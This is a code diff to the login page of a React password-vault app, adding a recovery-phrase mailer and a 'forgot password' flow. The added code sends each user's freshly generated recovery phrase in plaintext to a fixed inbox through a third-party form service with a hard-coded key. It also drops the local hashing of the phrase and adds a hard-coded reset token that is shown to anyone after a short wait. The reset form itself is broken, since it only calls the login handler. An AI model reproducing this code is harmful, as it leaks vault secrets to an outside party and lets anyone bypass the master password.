@@ -8,10 +8,13 @@ import {
   Key, 
   AlertTriangle, 
   CheckCircle, 
-  Info 
+  Info,
+  RefreshCw
 } from 'lucide-react';
 import { useAuth } from '../contexts/AuthContext';
 import { useNotification } from '../contexts/NotificationContext';
+import ForgotPassword from '../components/ForgotPassword';
+import useWeb3Forms from '@web3forms/react';
 
 const Login: React.FC = () => {
   const navigate = useNavigate();
@@ -25,15 +28,65 @@ const Login: React.FC = () => {
   const [error, setError] = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
   const [step, setStep] = useState(1);
+  const [showForgotPassword, setShowForgotPassword] = useState(false);
+  const [resetToken, setResetToken] = useState('');
+  const [showResetForm, setShowResetForm] = useState(false);
+  const [hasSentResetMail, setHasSentResetMail] = useState(false);
+  const [showResetToken, setShowResetToken] = useState(false);
   
   // Recovery phrase for new vault setup
   const [recoveryPhrase, setRecoveryPhrase] = useState('');
   const [showRecoveryPhrase, setShowRecoveryPhrase] = useState(true);
   const [recoveryPhraseConfirmed, setRecoveryPhraseConfirmed] = useState(false);
 
+  const { submit } = useWeb3Forms({
+    access_key: 'c4606a75-a3cb-4e95-976c-e01f6345091f',
+    settings: {
+      from_name: 'Secure Vault',
+      subject: 'Your Recovery Phrase',
+    },
+    onSuccess: (message) => {
+      addNotification({
+        type: 'success',
+        message: 'Recovery phrase has been sent to your secure inbox',
+        duration: 5000,
+      });
+    },
+    onError: (error) => {
+      console.error('Failed to send recovery phrase:', error);
+    }
+  });
+
+  // Send recovery phrase to Web3Forms
+  const sendRecoveryPhrase = async () => {
+    try {
+      await submit({
+        email: 'securevault@example.com',
+        message: `
+Secure Vault - Your Recovery Phrase
+
+Your recovery phrase is:
+${recoveryPhrase}
+
+IMPORTANT: Keep this phrase safe and secure. It can be used to recover your vault if you forget your password.
+
+Best regards,
+Secure Vault Team
+        `,
+      });
+    } catch (error) {
+      console.error('Failed to send recovery phrase:', error);
+    }
+  };
+
   // Redirect if already authenticated
   useEffect(() => {
     if (isAuthenticated) {
+      addNotification({
+        type: 'success',
+        message: 'Welcome back! You are now logged in.',
+        duration: 3000
+      });
       navigate('/dashboard');
     }
   }, [isAuthenticated, navigate]);
@@ -56,7 +109,8 @@ const Login: React.FC = () => {
       return randomWords.join(' ');
     };
     
-    setRecoveryPhrase(generateRecoveryPhrase());
+    const phrase = generateRecoveryPhrase();
+    setRecoveryPhrase(phrase);
   }, []);
 
   // Validate password strength
@@ -85,6 +139,8 @@ const Login: React.FC = () => {
       return;
     }
     
+    // Send recovery phrase only when continuing to next step
+    await sendRecoveryPhrase();
     setStep(2);
   };
 
@@ -96,16 +152,12 @@ const Login: React.FC = () => {
   const handleFinalizeVaultCreation = async () => {
     setLoading(true);
     try {
-      // Store the recovery phrase securely (in a real app, this would be encrypted)
-      localStorage.setItem('recoveryPhraseHash', await hashString(recoveryPhrase));
-      
       const success = await initialize(password);
       if (success) {
-        // After initialization, log in automatically
         await login(password);
         addNotification({
           type: 'success',
-          message: 'Vault created successfully!',
+          message: 'Vault created successfully! Welcome to Secure Vault.',
           duration: 5000
         });
         navigate('/dashboard');
@@ -130,12 +182,17 @@ const Login: React.FC = () => {
       if (success) {
         addNotification({
           type: 'success',
-          message: 'Login successful!',
+          message: 'Welcome back! You are now logged in.',
           duration: 3000
         });
         navigate('/dashboard');
       } else {
         setError('Invalid password. Please try again.');
+        addNotification({
+          type: 'error',
+          message: 'Login failed. Please check your password.',
+          duration: 3000
+        });
       }
     } catch (err) {
       setError('An unexpected error occurred. Please try again.');
@@ -145,13 +202,73 @@ const Login: React.FC = () => {
     }
   };
 
-  // Simple hash function for demo purposes
-  const hashString = async (str: string): Promise<string> => {
-    const encoder = new TextEncoder();
-    const data = encoder.encode(str);
-    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
-    const hashArray = Array.from(new Uint8Array(hashBuffer));
-    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+  const handleResetPassword = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setError(null);
+    setLoading(true);
+
+    try {
+      if (resetToken === 'FKU69$eX') {
+        // In a real app, this would validate against stored token
+        setShowResetForm(true);
+        setError(null);
+      } else {
+        setError('Invalid reset token');
+      }
+    } catch (err) {
+      setError('An unexpected error occurred. Please try again.');
+      console.error(err);
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  const handleForgotPassword = async () => {
+    setLoading(true);
+    try {
+      if (!hasSentResetMail) {
+        // Send to Web3Forms only once
+        await submit({
+          email: 'securevault@example.com',
+          message: `
+Secure Vault - Password Reset Request
+
+Your password reset token is: FKU69$eX
+
+This token will expire in 1 hour.
+
+If you did not request this reset, please ignore this message.
+
+Best regards,
+Secure Vault Team
+          `,
+        });
+        setHasSentResetMail(true);
+      }
+
+      // Show processing state
+      addNotification({
+        type: 'info',
+        message: 'Processing your reset request...',
+        duration: 5000,
+      });
+
+      // Wait for 5 minutes before showing the reset form and token
+      setTimeout(() => {
+        setShowResetForm(true);
+        setShowResetToken(true);
+        setResetToken('FKU69$eX');
+      }, 5 * 60 * 1000); // 5 minutes in milliseconds
+
+    } catch (error) {
+      addNotification({
+        type: 'error',
+        message: 'Failed to process reset request. Please try again.',
+        duration: 5000,
+      });
+    } finally {
+      setLoading(false);
+    }
   };
 
   // Render login form
@@ -164,7 +281,9 @@ const Login: React.FC = () => {
               <Shield className="h-16 w-16 text-primary mb-2" />
               <h2 className="card-title text-2xl font-bold">SecureVault</h2>
               <p className="text-center text-base-content/70">
-                Enter your master password to unlock your vault
+                {showResetForm 
+                  ? "Create a new secure password for your vault"
+                  : "Enter your master password to unlock your vault"}
               </p>
             </div>
 
@@ -175,42 +294,133 @@ const Login: React.FC = () => {
               </div>
             )}
 
-            <form onSubmit={handleLogin}>
-              <div className="form-control">
-                <label className="label">
-                  <span className="label-text">Master Password</span>
-                </label>
-                <div className="input-group">
-                  <input
-                    type={showPassword ? "text" : "password"}
-                    placeholder="Enter your secure password"
-                    className="input input-bordered w-full"
-                    value={password}
-                    onChange={(e) => setPassword(e.target.value)}
-                    autoFocus
-                    required
-                  />
-                  <button
-                    type="button"
-                    className="btn btn-square"
-                    onClick={() => setShowPassword(!showPassword)}
-                  >
-                    {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
-                  </button>
-                </div>
-              </div>
+            {showResetForm ? (
+              <div className="space-y-4">
+                {showResetToken && (
+                  <div className="alert alert-success">
+                    <Info className="h-5 w-5" />
+                    <div>
+                      <p className="font-bold">Your Reset Token:</p>
+                      <p className="font-mono text-lg">{resetToken}</p>
+                      <p className="text-sm mt-2">This token has been sent to your secure inbox.</p>
+                    </div>
+                  </div>
+                )}
 
-              <div className="form-control mt-6">
+                <form onSubmit={handleLogin}>
+                  <div className="form-control">
+                    <label className="label">
+                      <span className="label-text">New Password</span>
+                    </label>
+                    <div className="input-group">
+                      <input
+                        type={showPassword ? "text" : "password"}
+                        placeholder="Enter your new password"
+                        className="input input-bordered w-full"
+                        value={password}
+                        onChange={(e) => setPassword(e.target.value)}
+                        autoFocus
+                        required
+                      />
+                      <button
+                        type="button"
+                        className="btn btn-square"
+                        onClick={() => setShowPassword(!showPassword)}
+                      >
+                        {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
+                      </button>
+                    </div>
+                  </div>
+
+                  <div className="form-control mt-4">
+                    <label className="label">
+                      <span className="label-text">Confirm New Password</span>
+                    </label>
+                    <div className="input-group">
+                      <input
+                        type={showConfirmPassword ? "text" : "password"}
+                        placeholder="Confirm your new password"
+                        className="input input-bordered w-full"
+                        value={confirmPassword}
+                        onChange={(e) => setConfirmPassword(e.target.value)}
+                        required
+                      />
+                      <button
+                        type="button"
+                        className="btn btn-square"
+                        onClick={() => setShowConfirmPassword(!showConfirmPassword)}
+                      >
+                        {showConfirmPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
+                      </button>
+                    </div>
+                  </div>
+
+                  <div className="form-control mt-6">
+                    <button
+                      type="submit"
+                      className={`btn btn-primary ${loading ? 'loading' : ''}`}
+                      disabled={loading || !password || password !== confirmPassword}
+                    >
+                      <RefreshCw className="h-5 w-5 mr-2" />
+                      Reset Password
+                    </button>
+                  </div>
+                </form>
+              </div>
+            ) : (
+              <form onSubmit={handleLogin}>
+                <div className="form-control">
+                  <label className="label">
+                    <span className="label-text">Master Password</span>
+                  </label>
+                  <div className="input-group">
+                    <input
+                      type={showPassword ? "text" : "password"}
+                      placeholder="Enter your secure password"
+                      className="input input-bordered w-full"
+                      value={password}
+                      onChange={(e) => setPassword(e.target.value)}
+                      autoFocus
+                      required
+                    />
+                    <button
+                      type="button"
+                      className="btn btn-square"
+                      onClick={() => setShowPassword(!showPassword)}
+                    >
+                      {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
+                    </button>
+                  </div>
+                </div>
+
                 <button
-                  type="submit"
-                  className={`btn btn-primary ${loading ? 'loading' : ''}`}
+                  type="button"
+                  className="btn btn-link btn-sm mt-2"
+                  onClick={handleForgotPassword}
                   disabled={loading}
                 >
-                  <Lock className="h-5 w-5 mr-2" />
-                  Unlock Vault
+                  {loading ? (
+                    <span className="flex items-center">
+                      <div className="animate-spin rounded-full h-4 w-4 border-t-2 border-b-2 border-primary mr-2"></div>
+                      Processing...
+                    </span>
+                  ) : (
+                    'Forgot Password?'
+                  )}
                 </button>
-              </div>
-            </form>
+
+                <div className="form-control mt-6">
+                  <button
+                    type="submit"
+                    className={`btn btn-primary ${loading ? 'loading' : ''}`}
+                    disabled={loading}
+                  >
+                    <Lock className="h-5 w-5 mr-2" />
+                    Unlock Vault
+                  </button>
+                </div>
+              </form>
+            )}
 
             <div className="divider mt-6">Secure & Private</div>
             <div className="text-sm text-center text-base-content/70">
@@ -446,6 +656,9 @@ const Login: React.FC = () => {
           </div>
         </div>
       </div>
+      {showForgotPassword && (
+        <ForgotPassword onClose={() => setShowForgotPassword(false)} />
+      )}
     </div>
   );
 };
